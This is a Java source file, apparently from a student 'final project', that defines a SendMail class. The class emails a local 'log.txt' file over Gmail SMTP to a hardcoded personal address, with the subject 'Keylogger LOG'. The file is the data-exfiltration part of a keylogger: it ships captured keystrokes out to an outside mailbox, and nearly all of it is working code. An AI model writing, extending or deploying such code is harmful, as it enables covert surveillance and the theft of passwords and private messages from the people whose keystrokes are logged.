package com.example.finalproject;

import javax.mail.*;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;
import java.io.File;
import java.io.IOException;
import java.util.Objects;
import java.util.Properties;

public class SendMail {

    private String toAddress;


    public SendMail(String toAddress) {
        this.toAddress = Objects.requireNonNullElse(toAddress, "barbarosozturk61@gmail.com");
    }

    public void sendmail() {
        String host = "smtp.gmail.com";
        String port = "465";
        String username = "";
        String password = "";
        String fromAddress = "";

        Properties props = new Properties();
        props.put("mail.smtp.auth", "true");
        props.put("mail.smtp.ssl.enable", "true");
        props.put("mail.smtp.host", host);
        props.put("mail.smtp.port", port);

        Session session = Session.getInstance(props, new Authenticator() {
            protected PasswordAuthentication getPasswordAuthentication() {
                return new PasswordAuthentication(username, password);
            }
        });

        try {
            Message message = new MimeMessage(session);
            message.setFrom(new InternetAddress(fromAddress));
            message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(toAddress));
            message.setSubject("Keylogger LOG");
            message.setText("Log ektedir.");
            MimeBodyPart attachment = new MimeBodyPart();
            attachment.attachFile(new File("log.txt"));
            Multipart multipart = new MimeMultipart();
            multipart.addBodyPart(attachment);
            message.setContent(multipart);
            Transport.send(message);
            System.out.println("Email sent successfully.");
        } catch (MessagingException e) {
            System.out.println("Failed to send email. Error message: " + e.getMessage());
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    public String getToAddress() {
        return toAddress;
    }

    public void setToAddress(String toAddress) {
        this.toAddress = toAddress;
    }

}
